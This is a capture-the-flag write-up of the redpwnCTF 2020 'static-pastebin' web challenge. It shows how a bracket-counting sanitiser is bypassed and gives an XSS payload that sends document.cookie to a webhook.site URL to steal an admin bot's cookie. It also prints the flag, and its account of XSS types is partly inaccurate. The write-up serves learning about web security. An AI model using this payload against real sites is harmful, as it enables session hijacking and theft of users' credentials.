# static-pastebin
**Category:** Web

**Points:** 373

**Description:**
> I wanted to make a website to store bits of text, but I don't have any experience
with web development. However, I realized that I don't need any! If you experience
any issues, make a paste and send it `here` (https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin)
>
> **Site:** `static-pastebin.2020.redpwnc.tf`
>
> **Note:** The site is entirely static. Dirbuster will not be useful in solving it.
>
> **Author:** BrownieInMotion

## Writeup
The first thing I do is check out both websites. The first website after "here"
was a bot URL submission page. The other website is a big text box, so yes, a
pastebin.

![Bot Submission](https://github.com/itsecgary/CTFs/tree/master/redpwnCTF%202020/static-pastebin/bot_submission.PNG)

![Bot Submission](https://github.com/itsecgary/CTFs/tree/master/redpwnCTF%202020/static-pastebin/pastebin.PNG)

Right away I realized this had to be a reflected XSS (Cross-Site Scripting) attack. There
are two types of XSS attacks: **stored** and **reflected**. A **stored** XSS attack
usually happens when a malicious script from an attacker is injected into a website
which is vulnerable to it. One application of this could be a reverse PHP shell,
allowing the attacker access to the webserver. Now, a **reflected** XSS attack
is when a malicious script is injected into a website, but takes advantage of people
visiting this website. Basically, an attacker is able to change a webpage in a way
to mess with another user/website visitor.

In this case, we have a **reflected** XSS attack because we have a bot page coming
to visit our website and it probably has some important information in it's **cookies**.
Anyways, let's see what happens if we paste something and enter it:

![First Attempt](https://github.com/itsecgary/CTFs/tree/master/redpwnCTF%202020/static-pastebin/first_try.PNG)

Looks like the link it generated for us is in base64, but makes it so that we can
really put anything and it will condense down to a website the bot can go to. I
opened up the source code to see what we are working with. They have a public JS
file shown to us:
```
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```

Aaaaaand some sanitation. Looks like it doesn't want us to put any tags in at all.
The sanitation method is weird though. They use a counter to determine whether any
bracket has been laid down. If two have been laid down, everything in between those
brackets will be sanitized. Unlessss we switch up the order of the tags.

**Payload:** ` ><script>< `

**Output:**
```
<div id="paste">
    &gt;<script><</script>
</div>
```

I tried a few ways to get an **alert** to pop up, but no luck. I figured out that
the only thing that is possible is to make this exploit in **one tag**. But how?


The `<img>` tag has a `src` attribute, which allows us to maybe redirect the
user to a different website. I ended up getting this to return a JS alert:
` ><img src=x onerror=alert(1);>< `.

Sweet! This is definitely a sanity check lol. Now I needed to just steal the bot's
cookie (or my own for testing). This took me about a year to find, but this
website called **Webhook** gives us a url to live on and send request to. I did some
digging and research and found the final exploit. I will have my cookie be:
` XSS = but make it reflected `.

**Exploit:**
```
><img src=x onerror=this.src='https://webhook.site/b3ead4c5-b498-4d5f-9b82-f6fa49d9639f/?'+document.cookie; this.removeAttribute('onerror');><
```

**Webhook:**

![First Attempt](https://github.com/itsecgary/CTFs/tree/master/redpwnCTF%202020/static-pastebin/make_it_reflected.PNG)

Niceeeeee. Now let's give this malicious cookie-stealing link to the admin bot.

**Webhook:**

![First Attempt](https://github.com/itsecgary/CTFs/tree/master/redpwnCTF%202020/static-pastebin/bot.PNG)

I thought this challenge was pretty cool to be honest. I learned about XSS attacks
in school, but never had to develop a payload for one. Awesome challenge.

## Flag
flag{54n1t1z4t10n_k1nd4_h4rd}

## Resources
[Webhook](https://webhook.site/)
